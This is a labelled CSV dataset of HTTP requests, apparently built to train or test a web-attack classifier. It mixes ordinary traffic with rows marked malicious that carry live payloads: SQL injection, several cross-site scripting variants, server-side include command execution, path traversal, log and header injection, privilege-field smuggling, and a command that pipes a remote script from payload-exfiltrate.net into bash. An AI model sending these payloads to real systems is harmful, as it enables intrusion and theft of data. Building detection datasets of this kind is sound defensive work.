label,text
malicious,"GET /app/products/search?category=books&category=computers&id=123&filter_evil_chars=true&id=%27%20UNION%20SELECT%20credit_card%20FROM%20users-- HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cache-Control: no-cache
Referer: https://secure-user-portal.net/app/home
Connection: keep-alive"
benign,"POST /api/v2/account/configuration/update HTTP/1.1
Host: settings-portal.cloud-infra.ai
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiNzgyMzQifQ.d6a1fjTlFvx3QKSqzHoM7RiqMv_bH02f1PyLLYQXaWc
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Connection: keep-alive
Content-Length: 352

{
  ""userId"": ""78234"",
  ""preferences"": {
    ""notifications"": {
      ""email"": true,
      ""sms"": false,
      ""push"": {
        ""enabled"": true,
        ""channels"": [""news"", ""updates"", ""alerts""]
      }
    },
    ""theme"": ""dark"",
    ""layout"": {
      ""sidebar"": {
        ""collapsed"": false,
        ""order"": [""dashboard"", ""reports"", ""settings""]
      }
    }
  },
  ""security"": {
    ""twoFactor"": {
      ""enabled"": true,
      ""methods"": [""authenticator_app"", ""backup_codes""]
    }
  }
}"
benign,"HEAD /index.html HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Connection: close"
malicious,"POST /api/v1/log/event HTTP/1.1
Host: secure-event-tracker.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Content-Type: application/json
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Content-Length: 246
Connection: keep-alive

{""username"": ""joshua45"", ""event"":""File upload"", ""event_details"": ""Completed upload\"", \""status_code\"": 200, \""user_id\"": \""admin\"", \""is_privileged\"": true, \""original_event\"": \""upload_started""}"
benign,"GET /gallery/photos/2024 HTTP/1.1
Host: vividtravelmemories.xyz
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Cookie: user_prefs_b64=eyJmb250U2l6ZSI6IjEyIiwidGhlbWUiOiJiZ2dlbmQifQ==
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
malicious,"POST /user/redirect HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
Accept: application/json, text/javascript
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Referer: https://online-retail-store.biz/cart
Content-Length: 59

{""continue_to"": ""https://ads.attacker-net.info/promo""}"
benign,"POST /user-csv-upload HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Content-Type: text/csv
Content-Length: 111
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Pragma: no-cache
Cookie: session_id=fa83cf9d7a584a3b9c88f5a9df27ac31
Connection: close

user_id,username,signup_date
201,jdoe,2024-05-12
202,msmith,2024-05-13
203,rgonzalez,2024-05-14"
benign,"GET /search/products/electronics?category=smartphones&brand=claritech&price_min=150&price_max=800&condition=new&availability=in_stock&sort=popularity_desc&page=2&currency=usd&discounted=true&rating_min=4&color=black&shipping=free HTTP/1.1
Host: techmart-portal.io
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9"
malicious,"GET /go?target=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUmVkaXJlY3RlZCEgWFNTJyk8L3NjcmlwdD4= HTTP/1.1
Host: api.session-authentication.io
User-Agent: curl/7.77.0
Accept: */*
Connection: keep-alive"
benign,"POST /api/v2/xml/createOrder HTTP/1.1
Host: shopcart-api.online-retail-store.biz
Authorization: Bearer 629d02f87c5b41f789bceff344a11e22
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Mobile Safari/537.36
Content-Length: 197
Connection: close

<Order>
  <customerId>557812</customerId>
  <items>
    <item>
      <sku>ELEC-998</sku>
      <quantity>2</quantity>
    </item>
    <item>
      <sku>HOME-442</sku>
      <quantity>1</quantity>
    </item>
  </items>
  <orderDate>2024-06-28T14:22:10Z</orderDate>
</Order>"
benign,"POST /v2/user/password-reset-request HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/json
Accept: application/json
Referer: https://community.game-dev-forum.org/login
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Cache-Control: no-cache
Content-Length: 55

{""email"":""lena.roberts@community.game-dev-forum.org""}"
benign,"POST /api/v1/register HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Accept: application/json
Origin: https://secure-user-portal.net
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.63 Safari/537.36
Content-Length: 156
Connection: close

{""email"":""alexandermason@secure-user-portal.net"",""password"":""P@ssw0rdSecure!"",""fullName"":""Alexander Mason"",""referralCode"":""FRIEND2024""}"
benign,"POST /ws/notifications HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1
Content-Type: application/soap+xml
Accept: application/soap+xml
Content-Length: 308
Connection: keep-alive
Cookie: sessionid=hf9283hdncjs98s0; theme=dark

<?xml version=""1.0""?>
<soap:Envelope xmlns:soap=""http://www.w3.org/2003/05/soap-envelope"">
  <soap:Body>
    <PostNotification xmlns=""http://community.game-dev-forum.org/ws"">
      <User>gamefan88</User>
      <Message>Your post has been liked by 10 users.</Message>
    </PostNotification>
  </soap:Body>
</soap:Envelope>"
benign,"DELETE /api/v1/blog/posts/5acb23 HTTP/1.1
Host: community.game-dev-forum.org
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiamRvZSJ9.DummySig
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15
Accept: application/json
Cache-Control: no-cache
Connection: close"
benign,"GET /robots.txt HTTP/1.1
Host: embedded-iot-network.org
User-Agent: curl/7.85.0
Accept: */*
Connection: keep-alive"
malicious,"GET /articles/2023/07/27 HTTP/1.1
Host: tech-trend-reporting.net
User-Agent: Mozilla/5.0 <b onmouseover=alert('LogViewerXSS')>Inject</b> AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br
Cache-Control: no-cache"
benign,"GET /robots.txt HTTP/1.1
Host: online-retail-store.biz
User-Agent: bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Accept-Encoding: gzip, deflate
Connection: close"
benign,"GET /discover/search?search=SELECT%20best%20option%20FROM%20list HTTP/1.1
Host: explore-nextgen-platform.cloud
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Connection: keep-alive
Upgrade-Insecure-Requests: 1"
malicious,"GET /user/alerts HTTP/1.1
Host: alerts.smart-home-services.ai
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
X-Forwarded-Host: evil-tracking-domain.net
Pragma: no-cache
Cache-Control: no-cache
Connection: keep-alive"
benign,"GET /resource/load?file=reports/quarterly/q1_financial_summary_2024.xlsx HTTP/1.1
Host: boardmeetings-files.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/*;q=0.9
Accept-Language: en-US,en;q=0.7
Cache-Control: no-cache
Connection: close"
benign,"POST /signup HTTP/1.1
Host: greenfarmersmarket.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: https://greenfarmersmarket.io
Cache-Control: max-age=0
Connection: keep-alive

email=mark_wilson%40greengrow.com"
malicious,"POST /api/v1/user/settings HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Origin: https://api.cloud-data-services.ai
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Cache-Control: no-cache
Content-Length: 69
Connection: close

user_bio=Experienced+developer+%3C%21--%23InClUdE+fIlE%3D%22%2Fvar%2Fwww%2Fsecret.txt%22+--%3E"
malicious,"GET /app/layout.shtml?welcome_msg=Welcome%20back%2C%20user%20%3C!--#EXEc%20CMD=%22whoami%22--%3E HTTP/1.1
Host: cloud-office-apps.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36
Accept: text/html
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"OPTIONS /api/v2/items HTTP/1.1
Host: analytics.fintech-innovators.biz
Connection: keep-alive
Access-Control-Request-Method: GET
Access-Control-Request-Headers: authorization
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: */*"
malicious,"GET /search?term=%26lt%3Bscript%26gt%3Balert%28%26%2339%3BXSS_%20Vulnerability_Found%26%2339%3B%29%26lt%3B%2Fscript%26gt%3B HTTP/1.1
Host: social-connect-hub.cc
Connection: keep-alive
Accept: text/html
Accept-Language: en-CA,en;q=0.9
Referer: https://social-connect-hub.cc/feed
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0"
malicious,"GET /app/user/settings HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 <script>alert('LogViewerXSS')</script> (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /static/illustrations/faq-question-mark.svg HTTP/1.1
Host: helpdesk-support-center.org
Accept: image/svg+xml,image/*;q=0.8
Referer: https://helpdesk-support-center.org/kb/article/502
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Mobile Safari/537.36
Cache-Control: max-age=0
Connection: keep-alive"
benign,"POST /accounts/password-reset/request HTTP/1.1
Host: event-management-suite.com
Content-Type: application/json
Accept: application/json
Cache-Control: no-store
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148
Content-Length: 50

{""email"":""daniel.james@event-management-suite.com""}"
benign,"POST /account/authenticate HTTP/1.1
Host: api.city-marketplace.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 52
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.7
Origin: https://api.city-marketplace.io
Referer: https://api.city-marketplace.io/account/login
Cookie: auth_token=eyJhbGciOiJSUzI1NiI7; csrf_token=e1f2d3a4b5c6d7
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15
Connection: close

email=greta.olson%40citymarket.co&password=z3R5d3e8W"
malicious,"PUT /api/updatePreferences HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Content-Length: 183
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36

{""user_id"": 8347, ""email_notifications"": true, ""homepage_link"": ""\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029""}"
benign,"GET /user/messages/unread?folder=important HTTP/1.1
Host: mail-cloud-services.ai
Accept: application/json, text/plain, */*
Accept-Language: fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5
User-Agent: python-requests/2.28.2
X-Forwarded-For: 203.0.113.195
Connection: close"
malicious,"GET /cgi-bin/header.shtml?template_name=main<!--#exec cmd=""id""--> HTTP/1.1
Host: proxy-service-gateway.biz
User-Agent: Wget/1.20.3 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Accept-Language: en
Connection: close"
benign,"GET /api/v1/events?tag=outdoor&tag=family-friendly&tag=music&date=2024-06-15 HTTP/1.1
Host: vibrantcity-events.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Accept: application/json
Referer: https://vibrantcity-events.net/home
Cache-Control: max-age=60
Connection: keep-alive"
benign,"GET /search?q=local+organic+farmers HTTP/1.1
Host: greenfields-communityfarm.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip
Accept-Language: en-GB,en;q=0.7
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Connection: keep-alive
Referer: https://www.greenfields-communityfarm.com"
malicious,"GET /validate?message=check_status%0d%0a198.51.100.42 - eviluser [03/May/2024:18:45:00 -0400] ""GET /validate?message=check_status HTTP/1.1"" 400 512 HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Referer: https://status.api.cloud-data-services.ai/home
Connection: close"
benign,"POST /profile/avatar/upload HTTP/1.1
Host: avatar-storage-service.online
User-Agent: Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.63 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Content-Type: multipart/form-data; boundary=----Boundary987654321
Content-Length: 216

------Boundary987654321
Content-Disposition: form-data; name=""file""; filename=""avatar_description.txt""
Content-Type: text/plain

Avatar description and preferences uploaded for profile customization.
------Boundary987654321--"
benign,"GET /gallery/photos?album=vacation2023&album=family&album=friends HTTP/1.1
Host: pixelperfect-photos.biz
Accept: image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Referer: https://pixelperfect-photos.biz/home
Connection: keep-alive
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36"
benign,"HEAD /newsletters/subscribe/confirmation HTTP/1.1
Host: daily-insight-newsletter.com
User-Agent: curl/7.85.0
Accept: */*
Connection: close"
benign,"POST /feedback/submit HTTP/1.1
Host: analytics-review-center.io
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml
Content-Length: 88
Connection: keep-alive

comment=When+writing+queries%2C+I+usually+start+with+SELECT+statements+to+pull+data+FROM+the+main+table."
benign,"POST /community/posts/9934/post_comment HTTP/1.1
Host: greenpulse-media.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 160
Connection: keep-alive
Accept-Language: en-US,en;q=0.8
Referer: https://greenpulse-media.io/community/posts/9934
Cookie: uid=998122u3y45smslx; token=2sdhj2438jfsd8983nmf
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36

author_name=Sophia+Martinez&comment_text=Appreciate+the+clear+explanation+on+sustainability+issues+covered+here.&csrf_token=a27f6b1da8f742e6a87a6d59d8131f2d"
benign,"OPTIONS /api/v1/resources/84215 HTTP/1.1
Host: data-sync.cloudnative-services.dev
Origin: https://analytics.web-dashboard.io
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type, x-custom-header, x-api-key
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: */*
Connection: keep-alive"
malicious,"POST /api/v3/items/runCommand HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Content-Length: 126

{""command"":""/opt/maintenance/check.sh && curl http://payload-exfiltrate.net/exploit.sh | bash"",""user"":""operator"",""timestamp"":""2024-06-12T22:08:00Z""}"
benign,"GET /library/books/details?id=1024&edition=3rd&includeReviews=true HTTP/1.1
Host: urban-library-catalog.info
Accept: application/json
Accept-Language: en-US,en;q=0.8
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1
Referer: https://urban-library-catalog.info/library/books/search"
benign,"POST /oauth/token HTTP/1.1
Host: auth.my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 125
Authorization: Basic bXlkZXZpY2U6Ym9vdHNlY3JldA==
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept: application/json
Connection: keep-alive

grant_type=authorization_code&code=7df4399c1fea2ad3&redirect_uri=https%3A%2F%2Fmy-personal-blog-site.info%2Fauth%2Fcallback&client_id=mydevice&client_secret=bootsecret"
benign,"GET /comments/load?articleId=2391&comment=This%20is%20%26lt%3Bbold%26gt%3B HTTP/1.1
Host: newswire-archive.org
Accept: text/html,application/xml
Accept-Language: en-US,en;q=0.9
Referer: https://newswire-archive.org/articles/2391
User-Agent: curl/7.85.0
Connection: close"
malicious,"GET /user/dashboard HTTP/1.1
Host: interactive-learning-hub.edu
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cookie: lang_file=../../../../etc/profile%00conf; session_token=xyz987654321"
